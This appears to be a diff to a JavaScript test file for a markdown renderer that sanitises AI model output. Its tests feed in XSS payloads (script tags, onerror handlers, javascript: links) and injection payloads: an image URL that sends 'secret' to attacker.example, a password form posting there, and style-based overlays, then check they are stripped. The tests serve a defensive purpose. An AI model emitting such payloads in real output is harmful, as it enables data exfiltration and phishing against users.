@@ -10,7 +10,17 @@ const render = (content) => renderMarkdown(content, purifier);
 test('strips script-bearing HTML from model output', () => {
   const html = render('Hello <img src=x onerror="alert(1)"> <script>alert(2)</script> <a href="javascript:alert(3)">x</a>');
   assert.doesNotMatch(html, /onerror|<script|javascript:/i);
-  assert.match(html, /<img src="x">/);
+  assert.match(html, /^<p>Hello/);
+});
+
+test('strips remote images, forms and styles that injected output could abuse', () => {
+  const html = render(
+    '![x](https://attacker.example/c?d=secret) <img src="https://attacker.example/p.gif">\n\n' +
+    '<form action="https://attacker.example" method="post"><input type="password"><button>Go</button></form>\n\n' +
+    '<style>body{display:none}</style><p style="position:fixed">overlay</p>'
+  );
+  assert.doesNotMatch(html, /<img|<form|<input|<button|<style|style=|attacker\.example/i);
+  assert.match(html, /overlay/);
 });
 
 test('keeps markdown formatting', () => {
